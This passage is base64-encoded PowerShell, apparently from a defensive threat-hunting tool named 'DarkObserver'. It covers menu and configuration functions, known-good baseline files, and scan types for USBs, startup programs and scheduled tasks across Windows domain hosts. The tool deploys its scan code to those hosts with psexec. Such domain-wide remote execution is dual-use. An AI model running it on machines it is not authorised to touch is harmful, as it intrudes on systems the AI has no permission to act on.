lbSAiJGlucHV0IikuRnVsbE5hbWUgI2Z1bGwgcGF0aCBuZWVkZWQgZm9yIHNjcmlwdCB0byBydW4gcHJvcGVybHkKCQkJIiR7aW5wdXR9U2NhbnMke3RvZGF5fSIKCQkJIiR7aW5wdXR9U2NhbnMke3RvZGF5fV9URU1QIgoJCQkkc2NyaXB0Ok9VVF9ESVJfcm9vdCA9ICRpbnB1dAoJCQlyZXR1cm4KCQl9CiAgICB9Cn0KCiNTZXQgbG9jYXRpb24vY3JlYXRlIGtub3duIGdvb2QgZmlsZXMgZm9yIGRhdGEgcGFyc2luZwpGdW5jdGlvbiBTZXRLbm93bkdvb2QKewoJI2tub3duIGdvb2QgZGlyZWN0b3J5IG5vdCBmb3VuZCBjcmVhdGUgYW5kIGZpbGwgd2l0aCBmaWxlcwoJaWYoLW5vdCAoVGVzdC1QYXRoICIkUFNTY3JpcHRSb290XEtub3duR29vZCIgLVBhdGhUeXBlIENvbnRhaW5lcikpCgl7CgkJbWtkaXIgIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kIiB8T3V0LU51bGwKCQkkbnVsbHxBZGQtQ29udGVudCAiJFBTU2NyaXB0Um9vdFxLbm93bkdvb2RcVXNlckV4ZVNlYXJjaC50eHQiCgkJJG51bGx8QWRkLUNvbnRlbnQgIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXFVTQnMudHh0IgoJCSRudWxsfEFkZC1Db250ZW50ICIkUFNTY3JpcHRSb290XEtub3duR29vZFxTdGFydFVwUHJvZ3JhbXMudHh0IgoJCSRudWxsfEFkZC1Db250ZW50ICIkUFNTY3JpcHRSb290XEtub3duR29vZFxTY2hlZHVsZWRUYXNrcy50eHQiCgkJJG51bGx8QWRkLUNvbnRlbnQgIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXFJ1bm5pbmdQcm9jcy50eHQiCgkJJG51bGx8QWRkLUNvbnRlbnQgIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXERyaXZlcnMudHh0IgoJCSRudWxsfEFkZC1Db250ZW50ICIkUFNTY3JpcHRSb290XEtub3duR29vZFxTZXJ2aWNlcy50eHQiCgkJJG51bGx8QWRkLUNvbnRlbnQgIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXEluc3RhbGxlZFNvZnR3YXJlLnR4dCIKCQkkbnVsbHxBZGQtQ29udGVudCAiJFBTU2NyaXB0Um9vdFxLbm93bkdvb2RcUmVxdWlyZWRIb3RGaXgudHh0IgoJfQoJCgkjRGlyZWN0b3J5IGlzIHByZXNlbnQuICBNYWtlIHN1cmUgZWFjaCBkYXRhIHBhcnNpbmcgZmlsZSBleGlzdHMKCWlmICgtbm90IChUZXN0LVBhdGggIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXFVzZXJFeGVTZWFyY2gudHh0IikpewoJCSRudWxsfEFkZC1Db250ZW50ICIkUFNTY3JpcHRSb290XEtub3duR29vZFxVc2VyRXhlU2VhcmNoLnR4dCIKCX0KCWlmICgtbm90IChUZXN0LVBhdGggIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXFVTQnMudHh0IikpewoJCSRudWxsfEFkZC1Db250ZW50ICIkUFNTY3JpcHRSb290XEtub3duR29vZFxVU0JzLnR4dCIKCX0KCWlmICgtbm90IChUZXN0LVBhdGggIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXFN0YXJ0VXBQcm9ncmFtcy50eHQiKSl7CgkJJG51bGx8QWRkLUNvbnRlbnQgIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXFN0YXJ0VXBQcm9ncmFtcy50eHQiCgl9CglpZiAoLW5vdCAoVGVzdC1QYXRoICIkUFNTY3JpcHRSb290XEtub3duR29vZFxTY2hlZHVsZWRUYXNrcy50eHQiKSl7CgkJJG51bGx8QWRkLUNvbnRlbnQgIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXFNjaGVkdWxlZFRhc2tzLnR4dCIKCX0KCWlmICgtbm90IChUZXN0LVBhdGggIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXFJ1bm5pbmdQcm9jcy50eHQiKSl7CgkJJG51bGx8QWRkLUNvbnRlbnQgIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXFJ1bm5pbmdQcm9jcy50eHQiCgl9CglpZiAoLW5vdCAoVGVzdC1QYXRoICIkUFNTY3JpcHRSb290XEtub3duR29vZFxEcml2ZXJzLnR4dCIpKXsKCQkkbnVsbHxBZGQtQ29udGVudCAiJFBTU2NyaXB0Um9vdFxLbm93bkdvb2RcRHJpdmVycy50eHQiCgl9CglpZiAoLW5vdCAoVGVzdC1QYXRoICIkUFNTY3JpcHRSb290XEtub3duR29vZFxTZXJ2aWNlcy50eHQiKSl7CgkJJG51bGx8QWRkLUNvbnRlbnQgIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXFNlcnZpY2VzLnR4dCIKCX0KCWlmICgtbm90IChUZXN0LVBhdGggIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXEluc3RhbGxlZFNvZnR3YXJlLnR4dCIpKXsKCQkkbnVsbHxBZGQtQ29udGVudCAiJFBTU2NyaXB0Um9vdFxLbm93bkdvb2RcSW5zdGFsbGVkU29mdHdhcmUudHh0IgoJfQoJaWYgKC1ub3QgKFRlc3QtUGF0aCAiJFBTU2NyaXB0Um9vdFxLbm93bkdvb2RcUmVxdWlyZWRIb3RGaXgudHh0IikpewoJCSRudWxsfEFkZC1Db250ZW50ICIkUFNTY3JpcHRSb290XEtub3duR29vZFxSZXF1aXJlZEhvdEZpeC50eHQiCgl9CgoJI0ZpbGwga25vd24gZ29vZCBoYXNoIHRhYmxlIHdpdGggcGF0aHMgdG8gZGF0YSBmaWxlcwoJJHNjcmlwdDpLbm93bkdvb2QgPSBAewoJCVVzZXJFeGUgPSAiJFBTU2NyaXB0Um9vdFxLbm93bkdvb2RcVXNlckV4ZVNlYXJjaC50eHQiCgkJVVNCID0gIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXFVTQnMudHh0IgoJCVN0YXJ0VXBQcm9nID0gIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXFN0YXJ0VXBQcm9ncmFtcy50eHQiCgkJU2NoZWRUYXNrcyA9ICIkUFNTY3JpcHRSb290XEtub3duR29vZFxTY2hlZHVsZWRUYXNrcy50eHQiCgkJUnVubmluZ1Byb2NzID0gIiRQU1NjcmlwdFJvb3RcS25vd25Hb29kXFJ1bm5pbmdQcm9jcy50eHQiCgkJRHJpdmVycyA9ICIkUFNTY3JpcHRSb290XEtub3duR29vZFxEcml2ZXJzLnR4dCIKCQlTZXJ2aWNlcyA9ICIkUFNTY3JpcHRSb290XEtub3duR29vZFxTZXJ2aWNlcy50eHQiCgkJU29mdHdhcmUgPSAiJFBTU2NyaXB0Um9vdFxLbm93bkdvb2RcSW5zdGFsbGVkU29mdHdhcmUudHh0IgoJCUhvdEZpeCA9ICIkUFNTY3JpcHRSb290XEtub3duR29vZFxSZXF1aXJlZEhvdEZpeC50eHQifQp9CgpGdW5jdGlvbiBoZWxwCnsKCVdyaXRlLUhvc3QgIgpBdmFpbGFibGUgT3B0aW9uczoKICBjb25mW2NdLi4uLi4uLlNldCBzY2FuIGNvbmZpZ3VyYXRpb24gdmFyaWFibGVzCiAgc2V0Li4uLi4uLi4uLi5WaWV3IGN1cnJlbnQgY29uZmlndXJhdGlvbgogIHNjYW5bc10uLi4uLi4uRXhlY3V0ZSBTY2FuCiAgaG9tZVtoXS4uLi4uLi5SZXR1cm4gdG8gcHJvbXB0CiAgZXhpdFt4XS4uLi4uLi5SZXR1cm4gdG8gcG93ZXJzaGVsbAoiCiMgIHNldC1jcmVkcy4uLi4uSW5wdXQgY3JlZGVudGlhbHMgdG8gdXNlIGZvciBzY2FuIChkZWZhdWx0IGlzIGN1cnJlbnQgdXNlcikKfQoKI3NldCB0aGUgaG9zdHMgdGhhdCBzaG91bGQgYmUgc2Nhbm5lZApGdW5jdGlvbiBTY2FuSG9zdHNGaWxlCnsKCXBhcmFtKCRDdXJyZW50Q2hvaWNlKQoJJGlucHV0ID0gUmVhZFllbGxvdwoJaWYoLW5vdCAkaW5wdXQpe3JldHVybiAkQ3VycmVudENob2ljZX0gI25vIHVzZXIgaW5wdXQgcmV0dXJuIGN1cnJlbnQgY2hvaWNlCgkKCSNnZW5lcmF0ZSBsaXN0IG9mIGFsbCBhY3RpdmUgaG9zdHMgaW4gZG9tYWluCglpZigkaW5wdXQgLWVxICJBTEwiKSAKCXsKCQkkc2NyaXB0OkZpcnN0UnVuQ29tcHMgPSAkVHJ1ZQoJCVJldHVybiAkaW5wdXQgCgl9CgkKCSNVc2VyIGlucHV0IGlzIG5vdCB2YWxpZC4gIEVpdGhlciBkb2VzIG5vdCBleGlzdCBvciBpcyBub3QgYSBmaWxlCgllbHNlaWYoLW5vdCAoVGVzdC1QYXRoICRpbnB1dCAtUGF0aFR5cGUgTGVhZikpCgl7CgkJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiICAkaW5wdXQgbm90IGZvdW5kIgoJfQoJCgkjVXNlciBpbnB1dCBpcyB2YWxpZC4gIFJldHVybiB1c2VyIGlucHV0CgllbHNlCgl7CgkJJHNjcmlwdDpGaXJzdFJ1bkNvbXBzID0gJFRydWUKCQkkc2NyaXB0Okhvc3RGaWxlTW9kVGltZSA9IChnY2kgJGlucHV0KS5MYXN0V3JpdGVUaW1lCgkJUmV0dXJuICRpbnB1dAoJfQp9CgpGdW5jdGlvbiBPdXRwdXRGb3JtYXQKewoJcGFyYW0oJEN1cnJlbnRDaG9pY2UpCgkkaW5wdXQgPSBSZWFkWWVsbG93CglpZigtbm90ICRpbnB1dCl7JEN1cnJlbnRDaG9pY2U7IHJldHVybn0KCXN3aXRjaCgkaW5wdXQpCgl7CgkJImNzdiJ7JGlucHV0fQoJCSJ4bHMieyRpbnB1dH0KCQkieGxzeCJ7JGlucHV0fQoJCSJ4bHNiInskaW5wdXR9CgkJZGVmYXVsdHtXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgUmVkICIgIENob2ljZXMgYXJlOiBjc3YsIHhscywgeGxzeCwgeGxzYiI7IHJldHVybiAkZmFsc2V9Cgl9Cn0KCkZ1bmN0aW9uIFRocmVhZENvdW50CnsKCXBhcmFtKCRDdXJyZW50Q2hvaWNlKQoJJFByb2NOdW0gPSAoZ3dtaSB3aW4zMl9jb21wdXRlcnN5c3RlbSkuTnVtYmVyb2ZMb2dpY2FsUHJvY2Vzc29ycyAjbnVtYmVyIG9mIHByb2Nlc3NvciBjb3JlcwoJJG1pbj0xICNtaW5pbXVtIG51bWJlciBvZiB0aHJlYWRzIGlzIDEKCSRtYXg9JFByb2NOdW0qMiAKCWlmKCRtYXggLWx0IDgpeyRtYXggPSA4fSAjbWF4aW11bSBudW1iZXIgb2YgdGhyZWFkcyBpcyB0d2ljZSB0aGUgbnVtYmVyIG9mIHByb2Nlc3NvciBjb3JlcyBvciA4LCB3aGljaGV2ZXIgaXMgbW9yZS4KCSRpbnB1dCA9IFJlYWRZZWxsb3cKCWlmKC1ub3QgJGlucHV0KXtbY29udmVydF06OlRvSW50MzIoJEN1cnJlbnRDaG9pY2UpOyByZXR1cm59Cgl0cnl7CgkJJGlucHV0ID0gW2NvbnZlcnRdOjpUb0ludDMyKCRpbnB1dCkgCgkJaWYoJGlucHV0IC1nZSAkbWluIC1hbmQgJGlucHV0IC1sZSAkbWF4KXskaW5wdXQ7IHJldHVybn0KCQllbHNlIHtXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgUmVkICIgIENob29zZSBhIG51bWJlciBmcm9tICRtaW4gdG8gJG1heCI7IHJldHVybiAkZmFsc2V9Cgl9IGNhdGNoIHsKCQlXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgUmVkICIgIENob29zZSBhIG51bWJlciBmcm9tICRtaW4gdG8gJG1heCI7IHJldHVybiAkZmFsc2UKCX0KfQoKRnVuY3Rpb24gU2V0U2NhbkRvbWFpbgp7CglwYXJhbSgkQ3VycmVudENob2ljZSkKCSRpbnB1dCA9IFJlYWRZZWxsb3cKCWlmKC1ub3QgJGlucHV0KQoJewoJCWlmKC1ub3QgJEN1cnJlbnRDaG9pY2UpewoJCQlXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgUmVkICIgIERvbWFpbiBuYW1lIGNhbm5vdCBiZSBudWxsIgoJCQlSZXR1cm4KCQl9CgkJJHNjcmlwdDpEaXN0aW5ndWlzaGVkTmFtZSA9ICJEQz0kKCRDdXJyZW50Q2hvaWNlLlJlcGxhY2UoJy4nLCcsREM9JykpIiAjY29udmVydCBmcWRuIGludG8gZGlzdGluZ3Vpc2hlZCBuYW1lCgkJUmV0dXJuICRDdXJyZW50Q2hvaWNlCQkKCX0KCglpZiAoJGlucHV0LnNwbGl0KCcuJykuY291bnQgLWVxIDEpICNpbnB1dCBpcyBub3QgYW4gZnFkbgoJewoJCWlmKC1ub3QgJEN1cnJlbnRDaG9pY2UpCgkJewoJCQkkZnFkbiA9ICRpbnB1dAoJCX0KCQllbHNlCgkJewoJCQlmb3IoJGk9MTsgJGkgLWx0ICRDdXJyZW50Q2hvaWNlLnNwbGl0KCcuJykuY291bnQ7ICRpKyspCgkJCXsKCQkJCSRyb290ID0gJHJvb3QrJy4nKyRDdXJyZW50Q2hvaWNlLnNwbGl0KCcuJylbJGldICNzdHJpcCB0aGUgZmlyc3QgZmllbGQgb2ZmIG9mIHRoZSBjdXJyZW50IGRvbWFpbgoJCQl9CgkJCSRmcWRuID0gIiRpbnB1dCRyb290IiAjcHJlcGVuZCBpbnB1dCB0byBjdXJyZW50IGRvbWFpbgoJCX0KCX0KCQoJJHNjcmlwdDpEaXN0aW5ndWlzaGVkTmFtZSA9ICJEQz0kKCRmcWRuLlJlcGxhY2UoJy4nLCcsREM9JykpIgoKCXRyeSB7CgkJaWYoW2Fkc2ldOjpFeGlzdHMoIkxEQVA6Ly8kRGlzdGluZ3Vpc2hlZE5hbWUiKSl7UmV0dXJuICRmcWRufQoJfSBjYXRjaCB7CgkJaWYoUmV0dXJuRnVuY3Rpb24gJGlucHV0KXtSZXR1cm4gJFRydWV9CgkJZWxzZQoJCXsKCQkJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAgIiAgRG9tYWluIG5vdCBmb3VuZDogJGZxZG4iCgkJfQoJfSAjRmluYWxseSB7JFRydWV9Cn0KCkZ1bmN0aW9uIENvbmZpZyAjcHJvbXB0IHVzZXIgZm9yIHJlcXVpcmVkIHNjYW4gdmFyaWFibGVzCnsKCVdyaXRlLUhvc3QgCgkKCSNTZXQgZGVmYXVsdCB2YWx1ZXMgaWYgdmFyaWFibGVzIGFyZSBub3QgYWxyZWFkeSBzZXQKCWlmKC1ub3QgJFNjYW5Ib3N0c0ZpbGUpeyRTY2FuSG9zdHNGaWxlPSJBTEwifQoJaWYoLW5vdCAkT1VUX0RJUl9yb290KXskT1VUX0RJUl9yb290PSQoR2V0LUxvY2F0aW9uKS5wYXRofQoJaWYoLW5vdCAkT3V0cHV0Rm9ybWF0KXskT3V0cHV0Rm9ybWF0PSJ4bHNiIn0KCWlmKC1ub3QgJFRocmVhZENvdW50KXskVGhyZWFkQ291bnQgPSAoZ3dtaSB3aW4zMl9jb21wdXRlcnN5c3RlbSkuTnVtYmVyb2ZMb2dpY2FsUHJvY2Vzc29yc30KCWlmKC1ub3QgJFNjYW5Eb21haW4peyRTY2FuRG9tYWluID0gJGVudjpVU0VSRE5TRE9NQUlOfQoJCgl3aGlsZSgkdHJ1ZSkgI2xvb3AgdW50aWwgaW5wdXQgaXMgdmFsaWQKCXsKCQlXcml0ZS1Ib3N0ICIgIERvbWFpbiBbJFNjYW5Eb21haW5dOiAiIC1Ob05ld0xpbmUgI3NldCBvdXQgZmlsZQoJCSRTY2FuRG9tYWluX3RlbXAgPSBTZXRTY2FuRG9tYWluICRTY2FuRG9tYWluCgkJaWYoJFNjYW5Eb21haW5fdGVtcCkKCQl7CgkJCWlmKCRTY2FuRG9tYWluX3RlbXAgLWVxICRUcnVlKXtXcml0ZS1Ib3N0OyBSZXR1cm4gJEZhbHNlfQoJCQllbHNlCgkJCXsKCQkJCSRzY3JpcHQ6U2NhbkRvbWFpbiA9ICRTY2FuRG9tYWluX3RlbXAKCQkJCWJyZWFrCgkJCX0KCQl9Cgl9Cgl3aGlsZSgkdHJ1ZSkKCXsKCQlXcml0ZS1Ib3N0ICIgIERhdGEgZGlyZWN0b3J5IFskT1VUX0RJUl9yb290XTogIiAtTm9OZXdMaW5lICNzZXQgb3V0IGZpbGUKCQkkT1VUX0RJUl90ZW1wLCRURU1QX0RJUl90ZW1wID0gU2V0T3V0RmlsZSAkT1VUX0RJUl9yb290CgkJaWYoJE9VVF9ESVJfdGVtcCkgI3NldE91dEZpbGUgd2FzIHN1Y2Nlc3NmdWwKCQl7CgkJCSRzY3JpcHQ6T1VUX0RJUiwgJHNjcmlwdDpURU1QX0RJUiA9ICRPVVRfRElSX3RlbXAsICRURU1QX0RJUl90ZW1wCgkJCSRTY3JpcHQ6c2Nhbi5URU1QX0RJUiA9ICRURU1QX0RJUgoJCQkkc2NyaXB0OlNDQU4uT1VUX0RJUiA9ICRPVVRfRElSCgkJCWJyZWFrCgkJfQoJfQoJd2hpbGUoJHRydWUpCgl7CgkJV3JpdGUtSG9zdCAiICBIb3N0cyB0byBzY2FuIFskU2Nhbkhvc3RzRmlsZV06ICIgLU5vTmV3TGluZQoJCSRTY2FuSG9zdHNGaWxlX3RlbXAgPSBTY2FuSG9zdHNGaWxlICRTY2FuSG9zdHNGaWxlCgkJaWYoJFNjYW5Ib3N0c0ZpbGVfdGVtcCkKCQl7CgkJCSRzY3JpcHQ6U2Nhbkhvc3RzRmlsZSA9ICRTY2FuSG9zdHNGaWxlX3RlbXAKCQkJYnJlYWsKCQl9Cgl9Cgl3aGlsZSgkdHJ1ZSkKCXsKCQlXcml0ZS1Ib3N0ICIgIE91dHB1dCBmb3JtYXQgWyRPdXRwdXRGb3JtYXRdOiAiIC1Ob05ld0xpbmUKCQkkT3V0cHV0Rm9ybWF0X3RlbXAgPSBPdXRwdXRGb3JtYXQgJE91dHB1dEZvcm1hdAoJCWlmKCRPdXRwdXRGb3JtYXRfdGVtcCkKCQl7CgkJCSRzY3JpcHQ6T3V0cHV0Rm9ybWF0ID0gJE91dHB1dEZvcm1hdF90ZW1wCgkJCWJyZWFrCgkJfQoJfQoJd2hpbGUoJHRydWUpCgl7CgkJV3JpdGUtSG9zdCAiICBUaHJlYWQgY291bnQgWyRUaHJlYWRDb3VudF06ICIgLU5vTmV3TGluZQoJCSRUaHJlYWRDb3VudF90ZW1wID0gVGhyZWFkQ291bnQgJFRocmVhZENvdW50CgkJaWYoJFRocmVhZENvdW50X3RlbXApCgkJewoJCQkkc2NyaXB0OlRocmVhZENvdW50ID0gJFRocmVhZENvdW50X3RlbXAKCQkJJFNjcmlwdDpzY2FuLlRocm90dGxlID0gJHNjcmlwdDpUaHJlYWRDb3VudAoJCQlicmVhawoJCX0KCX0KCVdyaXRlLUhvc3QKCVJldHVybiAkVHJ1ZQp9CgpGdW5jdGlvbiBTZXQtQ3JlZHMgI0dldCBkaWZmZXJlbnQgY3JlZGVudGlhbCB0aGFuIGxvZ2dlZCBvbiB1c2VyLiAgVGhpcyBGdW5jdGlvbmFsaXR5IGlzIGN1cnJlbnRseSBub3Qgd3JpdHRlbiBpbnRvIHRoaXMgc2NyaXB0CnsKCXRyeXsKCQkkc2NyaXB0OnNjYW4uY3JlZHMgPSBHZXQtQ3JlZGVudGlhbCAkbnVsbCAtRXJyb3JBY3Rpb24gU3RvcAoJfSBjYXRjaCB7JHNjcmlwdDpzY2FuLmNyZWRzID0gJG51bGx9Cn0KCkZ1bmN0aW9uIEN1cnJlbnRDb25maWcgI2Rpc3BsYXkgY3VycmVudGx5IHNldCBzY2FuIHZhcmlhYmxlcwp7CQoJI2lmKC1ub3QgJHNjYW4uY3JlZHMpIHskdW5hbWU9IkRlZmF1bHQifQoJI2Vsc2UgeyR1bmFtZT0kc2Nhbi5jcmVkcy5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLnVzZXJuYW1lfQoJaWYoLW5vdCAkc2NyaXB0OlNjYW5Eb21haW4pIHskc2NyaXB0OlNjYW5Eb21haW49JGVudjpVU0VSRE5TRE9NQUlOfQoJV3JpdGUtSG9zdCAKCVdyaXRlLUhvc3QgIiAgICAgICAgICAgIERvbWFpbjogJFNjYW5Eb21haW4iCglXcml0ZS1Ib3N0ICIgICAgRGF0YSBkaXJlY3Rvcnk6ICRPVVRfRElSX3Jvb3QiIAoJV3JpdGUtSG9zdCAiICAgICBIb3N0cyB0byBzY2FuOiAkU2Nhbkhvc3RzRmlsZSIgCglXcml0ZS1Ib3N0ICIgICAgIE91dHB1dCBmb3JtYXQ6ICRPdXRwdXRGb3JtYXQiIAoJV3JpdGUtSG9zdCAiICAgICAgVGhyZWFkIGNvdW50OiAkVGhyZWFkQ291bnQKCSIKCSNXcml0ZS1Ib3N0ICIgIFVzZXIgQ3JlZGVudGlhbHM6ICR1bmFtZQoJIyIgCn0KCkZ1bmN0aW9uIERhcmtPYnNlcnZlciAjZGFya29ic2VydmVyIGNvbW1hbmQgcHJvbXB0CnsKCVtjb25zb2xlXTo6Rm9yZWdyb3VuZENvbG9yID0gIndoaXRlIgoJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIG1hZ2VudGEgIkRhcmtPYnNlcnZlcj4gIiAtTm9OZXdMaW5lCgkkSW5wdXQgPSBSZWFkLUhvc3QKCXN3aXRjaCgkaW5wdXQpCgl7CgkJInNldCJ7Q3VycmVudENvbmZpZ30KCQkiY29uZiJ7Q29uZmlnfG91dC1udWxsfQoJCSJjIntDb25maWd8b3V0LW51bGx9CgkJInNjYW4ie0V4ZWN1dGV9CgkJInMie0V4ZWN1dGV9CgkJIyJzZXQtY3JlZHMie1NldC1DcmVkc30KCQkiY2xzIntDbGVhci1Ib3N0fQoJCSJleGl0IntXcml0ZS1Ib3N0ICIiOyBFeGl0RnVuY3Rpb259CgkJIngie1dyaXRlLUhvc3QgIiI7IEV4aXRGdW5jdGlvbn0KCQlkZWZhdWx0e0hlbHB9Cgl9Cn0KCkZ1bmN0aW9uIEV4aXRGdW5jdGlvbgp7CgkjUmVzZXQgY29sb3JzLCBjbGVhciBzY3JlZW4gYW5kIGV4aXQKCVtDb25zb2xlXTo6QmFja2dyb3VuZENvbG9yID0gJEJhY2tncm91bmRDb2xvcgoJW0NvbnNvbGVdOjpGb3JlZ3JvdW5kQ29sb3IgPSAkRm9yZWdyb3VuZENvbG9yCglDbGVhci1Ib3N0CglleGl0IDAKfQoKRnVuY3Rpb24gUmV0dXJuRnVuY3Rpb24KewoJcGFyYW0oJFVzZXJJbnB1dCkKCglzd2l0Y2goJFVzZXJJbnB1dCkKCXsKCQkieCJ7ZXhpdGZ1bmN0aW9ufQoJCSJleGl0IntleGl0ZnVuY3Rpb259CgkJImgie1JldHVybiAkVHJ1ZX0KCQkiaG9tZSJ7UmV0dXJuICRUcnVlfQoJfQp9CgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojCQlFTkQgTWVudSBGdW5jdGlvbnMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgCgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIwkJU1RBUlQgU2NhbiBGdW5jdGlvbnMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgCgojU2V0IGFsbCB2YXJpYWJsZXMgdG8gdG8gdXNlZCBmb3IgZWFjaCBzY2FuCkZ1bmN0aW9uIFNldFNjYW5UeXBlVmFycyAKewoJcGFyYW0oJFNlbGVjdGlvbikgI3NjYW4gY2hvaWNlCgkoZ2V0LURhdGUpLlRvU3RyaW5nKCkKCXN3aXRjaCAoJFNlbGVjdGlvbikgCiAgICB7CiAgICAgICAgMXsKCQkJJFNjcmlwdDpEZXBsb3kgPSAkdHJ1ZSAjbWVhbnMgdGhpcyBpcyB3aWxsIGNvcHkgb3ZlciBhIHNjcmlwdCB0byBiZSBleGVjdXRlZCB3aXRoIHBzZXhlYwogICAgICAgICAgICAkU2NyaXB0OlNjYW5UeXBlPSJ1c2VyIGV4ZWN1dGFibGUgc2VhcmNoIiAjdXNlZCBmb3IgcHJpbnRpbmcgc2NhbiBzdGF0dXMgdG8gc2NyZWVuCiAgICAgICAgICAgICRTY3JpcHQ6b3V0ZmlsZT0iVXNlckV4ZVNlYXJjaCQoKGdldC1kYXRlKS50b3N0cmluZygiSEhtbXNzIikpLmNzdiIgI2ZpbGUgd2hlcmUgZGF0YSB3aWxsIGJlIHBhcnNlZCBpbnRvCgkJCSRTY3JpcHQ6c2Nhbi5SZW1vdGVEYXRhRmlsZSA9ICJVc2VyRXhlU2VhcmNoMzkyMTI1MjgxIiAjZmlsZSB3aGVyZSBkYXRhIHdpbGwgb3V0cHV0IHRvIG9uIHJlbW90ZSBob3N0CgkJCSRTY3JpcHQ6c2Nhbi5UaW1lT3V0ID0gMjQwICNudW1iZXIgb2Ygc2Vjb25kcyB0byB3YWl0IGZvciBzY2FuIHRvIGNvbXBsZXRlICBkdXJpbmcgY29sbGVjdGlvbgoJCQkkU2NyaXB0OnNjYW4uUFMxQ29kZSA9ICRVc2VyRXhlU2VhcmNoQ29kZV9QUzEgI3Bvd2Vyc2hlbGwgY29kZSBmb3Igd2luZG93cyB2ZXJzaW9uIDYrCgkJCSRTY3JpcHQ6c2Nhbi5CQVRDb2RlID0gJFVzZXJFeGVTZWFyY2hDb2RlX0JBVH0gI2JhdGNoIHNjcmlwdCBmb3Igd2luZG93cyB2ZXJzaW9uIDwgNgoJCTJ7CgkJCSRTY3JpcHQ6RGVwbG95ID0gJHRydWUKICAgICAgICAgICAgJFNjcmlwdDpTY2FuVHlwZT0iVVNCIGVudW1lcmF0aW9uIgogICAgICAgICAgICAkU2NyaXB0Om91dGZpbGU9IlVTQl9FbnVtZXJhdGlvbiQoKGdldC1kYXRlKS50b3N0cmluZygiSEhtbXNzIikpLmNzdiIKCQkJJFNjcmlwdDpzY2FuLlJlbW90ZURhdGFGaWxlID0gIlVTQl9FbnVtZXJhdGlvbjM5MjEyNTI4MSIKCQkJJFNjcmlwdDpzY2FuLlRpbWVPdXQgPSAyNDAKCQkJJFNjcmlwdDpzY2FuLlBTMUNvZGUgPSAkVVNCX0VudW1lcmF0aW9uQ29kZV9QUzEKCQkJJFNjcmlwdDpzY2FuLkJBVENvZGUgPSAkVVNCX0VudW1lcmF0aW9uQ29kZV9CQVR9CgkJM3sKCQkJJFNjcmlwdDpEZXBsb3kgPSAkdHJ1ZQogICAgICAgICAgICAkU2NyaXB0OlNjYW5UeXBlPSJhdXRvLXJ1biBkaXNhYmxlIHF1ZXJ5IgogICAgICAgICAgICAkU2NyaXB0Om91dGZpbGU9IkF1dG9SdW5EaXNhYmxlJCgoZ2V0LWRhdGUpLnRvc3RyaW5nKCJISG1tc3MiKSkuY3N2IgoJCQkkU2NyaXB0OnNjYW4uUmVtb3RlRGF0YUZpbGUgPSAiQXV0b1J1bkRpc2FibGUzOTIxMjUyODEiCgkJCSRTY3JpcHQ6c2Nhbi5UaW1lT3V0ID0gMTIwCgkJCSRTY3JpcHQ6c2Nhbi5QUzFDb2RlID0gJEF1dG9SdW5EaXNhYmxlQ29kZV9QUzEKCQkJJFNjcmlwdDpzY2FuLkJBVENvZGUgPSAkQXV0b1J1bkRpc2FibGVDb2RlX0JBVH0KICAgICAgICA0ewoJCQkkU2NyaXB0OkRlcGxveSA9ICR0cnVlCiAgICAgICAgICAgICRTY3JpcHQ6U2NhblR5cGU9IlN0YXJ0LXVwIHByb2dyYW0gcXVlcnkiCiAgICAgICAgICAgICRTY3JpcHQ6b3V0ZmlsZT0iU3RhcnRVcFByb2dyYW1zJCgoZ2V0LWRhdGUpLnRvc3RyaW5nKCJISG1tc3MiKSkuY3N2IgoJCQkkU2NyaXB0OnNjYW4uUmVtb3RlRGF0YUZpbGUgPSAiU3RhcnRVcFByb2dyYW1zMzkyMTI1MjgxIgoJCQkkU2NyaXB0OnNjYW4uVGltZU91dCA9IDEyMAoJCQkkU2NyaXB0OnNjYW4uUFMxQ29kZSA9ICRTdGFydFVwUHJvZ3JhbXNDb2RlX1BTMQoJCQkkU2NyaXB0OnNjYW4uQkFUQ29kZSA9ICRTdGFydFVwUHJvZ3JhbXNDb2RlX0JBVH0KCQk1ewoJCQkkU2NyaXB0OkRlcGxveSA9ICR0cnVlCiAgICAgICAgICAgICRTY3JpcHQ6U2NhblR5cGU9InNjaGVkdWxlZCB0YXNrcyBxdWVyeSIKICAgICAgICAgICAgJFNjcmlwdDpvdXRmaWxlPSJTY2hlZHVsZWRUYXNrcyQoKGdldC1kYXRlKS50b3N0cmluZygiSEhtbXNzIikpLmNzdiIKCQkJJFNjcmlwdDpzY2FuLlJlbW90ZURhdGFGaWxlID0gIlNjaGVkdWxlZFRhc2tzMzkyMTI1MjgxIgoJCQkkU2NyaXB0OnNjYW4uVGltZU91dCA9IDEyMAoJCQkkU2NyaXB0OnNjYW4uUFMxQ29kZSA9ICRTY2hlZHVsZWRUYXNrc0NvZGVfUFMxCgkJCSRTY3JpcHQ6c2Nhbi5CQVRDb2RlID0gJFNjaGVkdWxlZFRh